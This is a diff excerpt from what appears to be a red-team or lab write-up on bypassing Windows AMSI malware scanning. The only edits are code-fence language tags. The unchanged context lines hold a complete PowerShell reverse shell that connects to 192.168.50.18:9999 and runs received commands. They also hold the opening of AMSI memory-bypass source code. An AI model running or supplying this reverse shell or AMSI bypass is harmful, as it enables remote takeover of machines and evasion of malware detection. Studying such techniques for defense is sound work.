@@ -2,7 +2,7 @@
 
 First, it was verified that the following powershell reverse shell command would be detected by AMSI.
 
-```
+```powershell
 $client = New-Object System.Net.Sockets.TCPClient('192.168.50.18',9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
@@ -46,7 +46,7 @@ Note : This bypass disables AMSI only for the terminal it was executed on.
 
 Source Code from https://aidenpearce369.github.io/offsec/AMSI-Memory-Bypass/ : 
 
-```
+```powershell
 $pinvoke_obj = @"
 using System;
 using System.Runtime.InteropServices;
